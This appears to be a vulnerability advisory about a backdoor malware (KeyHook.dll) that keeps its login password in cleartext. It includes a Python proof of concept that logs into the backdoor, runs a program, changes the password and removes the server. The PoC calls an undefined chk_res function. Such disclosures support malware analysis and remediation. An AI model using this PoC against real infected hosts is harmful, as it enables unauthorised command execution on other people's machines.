Vuln ID: MVID-2025-0703
Dropped files: C:\Windows\KeyHook.dll
Disclosure: 12/23/2025
Description: The malware listens on TCP ports 12632 and 12631. The backdoor server password "ecoli" is stored in cleartext in an .INI textfile, stored under "C:\Windows" having the same name as the malware. Third party attackers who have knowledge of the password can login and issue various commands separated by semicolon. Commands include program execution, change the backdoor password and malware removal using command "RemoveServer;1".
[Settings]
Port1=12631
ServerPwd=ecoli
LogTraffic=0
MailTo=
MailFrom=
MailHost=
Exploit/PoC:
from socket import \*
MALWARE\_HOST="x.x.x.x"
PORT=12631
def main():
s=socket(AF\_INET, SOCK\_STREAM)
s.connect((MALWARE\_HOST, PORT))
PAYLOAD="Password;0;ecoli\r\n"
s.send(PAYLOAD.encode())
#Run a program or app:
s.send("StartApp;calc\r\n".encode())
#Change backdoor password
s.send("ServerPwd;malvuln;\r\n".encode())
print(chk\_res(s))
#Remove backdoor use command ; 1
s.send("RemoveServer;1\r\n".encode())
s.close()
